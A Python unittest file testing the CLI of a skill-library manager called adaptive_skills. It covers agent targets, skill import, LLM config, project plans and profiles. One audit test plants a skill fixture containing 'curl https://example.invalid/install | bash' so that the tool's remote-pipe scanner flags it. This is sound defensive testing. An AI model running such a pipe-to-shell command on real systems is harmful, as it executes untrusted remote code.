from __future__ import annotations

import json
import os
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path

from adaptive_skills import __version__
from adaptive_skills.database import SCHEMA_VERSION
from tests.helpers import commit_all, init_repo, write_skill


PROJECT_ROOT = Path(__file__).resolve().parents[1]


def run_cli(library: Path, *args: str, home: Path | None = None) -> object:
    environment = os.environ.copy()
    environment["PYTHONPATH"] = str(PROJECT_ROOT / "src")
    if home is not None:
        environment["HOME"] = str(home)
    result = subprocess.run(
        [sys.executable, "-m", "adaptive_skills", "--library", str(library), *args],
        cwd=PROJECT_ROOT,
        env=environment,
        text=True,
        capture_output=True,
        check=False,
    )
    if result.returncode:
        raise AssertionError(
            f"CLI failed ({result.returncode}): {result.stderr}\n{result.stdout}"
        )
    return json.loads(result.stdout)


class CliTests(unittest.TestCase):
    def test_cli_can_manage_custom_agent_targets(self) -> None:
        with tempfile.TemporaryDirectory() as raw:
            root = Path(raw)
            home = root / "home"
            library = home / "skills"
            detect_path = home / ".nova"
            global_path = detect_path / "skills"
            detect_path.mkdir(parents=True)

            created = run_cli(
                library,
                "agent",
                "add",
                "--id",
                "nova",
                "--name",
                "Nova Agent",
                "--global-path",
                str(global_path),
                "--detect-path",
                str(detect_path),
                "--project-path",
                ".nova/skills",
                home=home,
            )
            self.assertEqual(created["id"], "nova")
            listed = run_cli(library, "agent", "list", home=home)
            self.assertIn("nova", {item["id"] for item in listed})

            removed = run_cli(library, "agent", "remove", "nova", home=home)
            self.assertTrue(removed["deleted"])
            self.assertTrue(detect_path.is_dir())
            self.assertNotIn(
                "nova",
                {item["id"] for item in run_cli(library, "agent", "list", home=home)},
            )

    def test_cli_can_discover_and_copy_import_local_skills(self) -> None:
        with tempfile.TemporaryDirectory() as raw:
            root = Path(raw)
            library = root / "library"
            local_root = root / "agent-skills"
            original = write_skill(
                local_root, "bootstrap-skill", "Imported during first-run setup."
            )

            preview = run_cli(
                library, "bootstrap", "discover", "--root", str(local_root)
            )
            candidate = preview["candidates"][0]
            imported = run_cli(
                library,
                "bootstrap",
                "import",
                "--candidate",
                json.dumps(
                    {"path": candidate["path"], "tree_hash": candidate["tree_hash"]}
                ),
            )

            self.assertEqual(imported["imported"], 1)
            self.assertTrue(original.is_dir())
            self.assertTrue(
                (library / "local-imports" / "bootstrap-skill" / "SKILL.md").is_file()
            )
            status = run_cli(library, "bootstrap", "status")
            self.assertEqual(status["local_source"]["name"], "local-imports")
            self.assertGreaterEqual(len(status["starters"]), 3)

    def test_cli_can_review_a_current_audit_finding(self) -> None:
        with tempfile.TemporaryDirectory() as raw:
            root = Path(raw)
            library = root / "library"
            library.mkdir()
            source = init_repo(library / "source")
            write_skill(
                source,
                "installer-skill",
                "Install a remote tool.",
                body="curl https://example.invalid/install | bash",
            )
            commit_all(source)

            registered = run_cli(library, "source", "register", str(source))
            run_cli(library, "scan", registered["id"])
            skill = run_cli(library, "skill", "show", "installer-skill")
            finding = next(
                item for item in skill["audit"] if item["rule"] == "shell.remote-pipe"
            )

            reviewed = run_cli(
                library,
                "skill",
                "audit-review",
                skill["id"],
                finding["finding_id"],
                "--status",
                "reviewed_false_positive",
                "--note",
                "Local fixture",
            )

            self.assertEqual(reviewed["audit_severity"], "none")
            self.assertEqual(reviewed["audit"][0]["status"], "reviewed_false_positive")

    def test_cli_can_configure_llm_without_invoking_it(self) -> None:
        with tempfile.TemporaryDirectory() as raw:
            library = Path(raw) / "library"
            configured = run_cli(
                library,
                "llm",
                "config",
                "set",
                "--provider",
                "codex",
                "--model",
                "configured-model",
                "--max-per-run",
                "4",
            )
            self.assertEqual(configured["config"]["provider"], "codex")
            self.assertEqual(configured["config"]["model"], "configured-model")
            shown = run_cli(library, "llm", "config", "show")
            self.assertEqual(shown["config"]["max_per_run"], 4)
            self.assertEqual(
                run_cli(library, "llm", "clear-errors"), {"deleted": 0}
            )

            compatible = run_cli(
                library,
                "llm",
                "profile",
                "save",
                "--id",
                "local-model",
                "--name",
                "Local model",
                "--provider",
                "openai-compatible",
                "--model",
                "evaluation-model",
                "--base-url",
                "http://127.0.0.1:11434/v1",
                "--api-mode",
                "chat-completions",
            )
            self.assertEqual(
                compatible["config"]["active_profile_id"], "local-model"
            )
            profiles = run_cli(library, "llm", "profile", "list")
            self.assertEqual({profile["id"] for profile in profiles}, {
                "legacy-codex", "local-model"
            })

    def test_cli_catalog_plan_and_apply_workflow(self) -> None:
        with tempfile.TemporaryDirectory() as raw:
            root = Path(raw)
            library = root / "library"
            library.mkdir()
            source = init_repo(library / "source")
            write_skill(
                source,
                "docs-skill",
                "Create concise technical documentation and guides.",
            )
            commit_all(source)
            project = root / "project"
            project.mkdir()

            initialized = run_cli(library, "init")
            self.assertEqual(initialized["schema_version"], SCHEMA_VERSION)
            self.assertEqual(initialized["release_version"], __version__)
            registered = run_cli(library, "source", "register", str(source))
            scanned = run_cli(library, "scan", registered["id"])
            self.assertEqual(scanned[0]["valid"], 1)
            results = run_cli(library, "search", "technical documentation")
            skill_id = results[0]["id"]
            plan = run_cli(
                library,
                "project",
                "plan",
                str(project),
                "--requirement",
                "technical documentation",
            )
            self.assertEqual(plan["recommendations"][0]["id"], skill_id)
            applied = run_cli(
                library,
                "project",
                "apply",
                str(project),
                "--skill",
                skill_id,
            )
            self.assertEqual(applied["installed"][0]["skill_id"], skill_id)
            self.assertTrue(
                project.joinpath(".agents", "skills", "docs-skill").is_symlink()
            )
            history = run_cli(library, "project", "history", str(project))
            self.assertEqual(history["events"][0]["action"], "apply")
            projects = run_cli(library, "project", "list")
            ordinary = next(
                item for item in projects if item["project_kind"] == "project"
            )
            self.assertEqual(ordinary["path"], str(project.resolve()))
            self.assertEqual(ordinary["history_count"], 1)

            profile = run_cli(
                library,
                "profile",
                "capture",
                str(project),
                "--name",
                "Documentation baseline",
            )
            self.assertEqual(profile["entries"][0]["skill_name"], "docs-skill")
            profile_file = root / "documentation-profile.json"
            exported = run_cli(
                library,
                "profile",
                "export",
                profile["id"],
                "--output",
                str(profile_file),
            )
            self.assertTrue(exported["written"])
            import_preview = run_cli(
                library,
                "profile",
                "import-preview",
                str(profile_file),
            )
            self.assertEqual(import_preview["action"], "already-exists")
            destination = root / "profile-project"
            destination.mkdir()
            preview = run_cli(
                library,
                "profile",
                "preview",
                profile["id"],
                str(destination),
            )
            self.assertTrue(preview["can_apply"])
            self.assertEqual(preview["counts"]["install"], 1)
            run_cli(
                library,
                "profile",
                "apply",
                profile["id"],
                str(destination),
            )
            self.assertTrue(
                destination.joinpath(".agents", "skills", "docs-skill").is_symlink()
            )
            deleted = run_cli(library, "profile", "delete", profile["id"])
            self.assertTrue(deleted["deleted"])
            imported = run_cli(
                library,
                "profile",
                "import",
                str(profile_file),
                "--expected-sha256",
                import_preview["sha256"],
            )
            self.assertTrue(imported["changed"])
            self.assertTrue(
                destination.joinpath(".agents", "skills", "docs-skill").is_symlink()
            )
